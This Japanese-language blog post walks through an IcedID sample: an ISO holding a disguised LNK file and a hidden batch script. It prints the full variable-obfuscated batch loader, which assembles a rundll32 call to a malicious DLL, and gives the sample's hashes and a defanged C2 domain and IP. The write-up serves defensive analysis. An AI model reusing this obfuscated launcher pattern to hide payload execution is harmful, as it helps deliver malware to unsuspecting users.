# IcedIDを見てみる

最近、 bumblebeeの新型が出てきたという話を見ながら、とはいえIcedIDも未だに使われてるな、と何となく感じました。  
あ、ちなみに以下の記事をベースにして話してます。

[bumblebeeの新型が出たという記事](https://www.bleepingcomputer.com/news/security/bumblebee-malware-adds-post-exploitation-tool-for-stealthy-infections/)

[LoaderがIcedIDなどからbumblebeeに移行している記事](https://thehackernews.com/2022/04/cybercriminals-using-new-malware-loader.html)

ちなみにmalware bazaarで見る限りそれぞれ以下の検知量になっています。  

![bumblebeeの統計](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/bumblebee-stats.png)
引用元： https://bazaar.abuse.ch/browse/tag/BUMBLEBEE/

![icedidの統計](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/icedid-stats.png)
引用元： https://bazaar.abuse.ch/browse/tag/BUMBLEBEE/

うーん。IcedIDが減った、のは事実でしょうが正直bumblebeeの数（グラフのスケールが12までになってますのでだいぶ少ない）ということを考えますとまだまだIcedIDの方が多いですね。  
Note: スケールの変え方わからないので見づらい。。

まぁ、とりあえずIcedIDはまだまだちょくちょく名前を聞きますのでこっちを見てみよう！ということでチェックしていきます。

### 対象マルウェア

今回見るのは以下のハッシュ値です。  
`2bfaaf86092bd183c8295fded306708d154874e5aed0d6743e591c8f469858be`

レポーターは、`pr0xylife`さんですね。twitterフォローしてますけどおすすめです。  
![twitter](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/proxylife-twitter.png)
引用： https://twitter.com/pr0xylife/status/1567663680099082240

まぁ、このツイートと今回のものはハッシュ違いますが。内容は同じです。  
それでは、とりあえず進めていきましょう。  

### ファイルを見てみる

まず、検体(zip)をダウンロードして解凍するとisoファイルが入っています。  
![isoファイル](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/iso-file.png)

さて、このisoファイルをマウントしてみてみましょう。そうすると正直いつも通りの状態になってます。  

![isoファイル](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/iso-file02.png)

なんというか、これ見てると思いますがしばらくは隠しファイルも表示するのをデフォルトにした方がいいんじゃないかな、と思いますね。  

ついでに`Document`という名前のファイルですがこれはリンクファイルです。アイコンはexplorerになってますが、実際には`led\\xenopus.bat`

![lnkファイル](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/lnk-file.png)

では、このバッチはどうなっているのか？これを見てみましょう。  
長いですけど、最後まで書いておきましょう。これだけだったら悪性の挙動しないですからね、DLLファイルは上げてないので。  

```bat
@echo off
:dkympiohczr
set rovbcq=l
:lbszqranmew
set njplbf=f
:hplfjzkiqva
set rhwmko=w
:otsnhbwzekq
set nvatjr=k
:riyfavsctle
set xdszpj=h
:pugjfqdmvit
set kmahbn=p
:ezcpoxbufvk
set yegwaz=o
:rnlmegyxboj
set mlprxq=d
:dzftlpmcksu
set vngouf=c
:qezbywdvinm
set rjkzxm=s
:laoefyrdtkg
set sgabfw=x
:nhlziuxydpb
set drxklq=e
:jqklgerxzsf
set jnboce=g
:bdocljgiewy
set ligzpu=i
:nzdqmlbugia
set axmgkn=a
:hvnxsemopcq
set iaxhro=t
:lazyruehsvc
set cuypsm=q
:pjflbraimhs
set venfld=u
:gzkoxpqeacn
set rkbtwm=n
:mswjvotzxbe
set nyhdtv=m
:uqgicfvhaxy
set jmaobn=b
:krsulcitzdx
set dztvcy=y
:emnrhsyfcvq
set xgsmbj=z
:wjgnzliekft
set lzaxgo=r
:hwudryzocpv
set fvnqul=j
:emtwukylfor
set smicae=v
:phqvgsmyiej
:ZJJ%kmahbn%%sgabfw%%vngouf%C%mlprxq%UQ%drxklq%T%rjkzxm%%njplbf%%nvatjr%Q%xdszpj%DH%xdszpj%B%njplbf%MB%xgsmbj%K%rovbcq%O
%lzaxgo%%venfld%%rkbtwm%%mlprxq%%rovbcq%%rovbcq%32 %rovbcq%%drxklq%%mlprxq%\%kmahbn%%lzaxgo%%drxklq%%kmahbn%%yegwaz%%rjkzxm%%rjkzxm%%drxklq%%rjkzxm%%rjkzxm%%ligzpu%%rkbtwm%%jnboce%.%mlprxq%%rovbcq%%rovbcq%,#1
:I%nvatjr%V%rhwmko%S%xdszpj%MQ
```

これ、何やってるかお分かりになりますかね？正直簡単な内容だからわかる人も多いかな、とは思います。  
内容は、単純で変数を定義してそれを組み合わせてコマンドを作ってます。

こういう時、逐一組み立ててもいいんですが、コマンド実行するところを`echo`で画面に出してしまうのが一番簡単です。  
ということで、以下のようにしてみます。(最後もついでにechoしました)  
```dos
echo %lzaxgo%%venfld%%rkbtwm%%mlprxq%%rovbcq%%rovbcq%32 %rovbcq%%drxklq%%mlprxq%\%kmahbn%%lzaxgo%%drxklq%%kmahbn%%yegwaz%%rjkzxm%%rjkzxm%%drxklq%%rjkzxm%%rjkzxm%%ligzpu%%rkbtwm%%jnboce%.%mlprxq%%rovbcq%%rovbcq%,#1
echo :I%nvatjr%V%rhwmko%S%xdszpj%MQ
```

で、batを実行してみると以下のようになります。  

![コマンド実行箇所](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/cmd01.png)

さて、これで分かったことはdllファイルをrundll32で動かしていることですね。では今度はこのDLLファイルを見てみましょうか。  

sha256: c6d6277f1355336eb5da55531c1cc927067a1defee412c60ceb281452d2388d6

virustotalでは以下になってます。さすがに時間がたってるので大量に検出されてますね。  
![dll01](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/dll-vt01.png)

relationを見ると、以下のように通信しているようです。  

![dll02](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/dll-vt02.png)

通信先は`hxxp[:]//leonyelloswen[.]com`というURLになっています。  
名前解決後のIPアドレスは`138[.]197[.]151[.]48`です。

次に、DLL起動後に以下のようにインジェクション挙動があるようです。  
うーん。これについては何を起動するところで検知したのかがわからないですし、何とも言い難いです。  
![dll03](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/dll-vt03.png)

サスペンドでプロセス起動するインジェクションで有名なのは`process hollowing`だと思いますが、これはどうなんでしょうかね。。  

さて、次にsandboxの古典的回避があったのでそれを見ます。  
![dll04](https://raw.githubusercontent.com/proshiba/analysis/main/icedid/images/dll-vt04.png)

長時間のスリーブは、なんだかんだ言ってやっぱり使われますね。  

静的解析も出来ればいいんですけどね。いずれは書いていきたい。

### 終わりに。

今回は、IcedIDを見ていきました。正直いつもとそこまで変わらない挙動をしていたような気もしますが。  
次は、bumblebeeを見てみましょうかね。ありがとうございました。
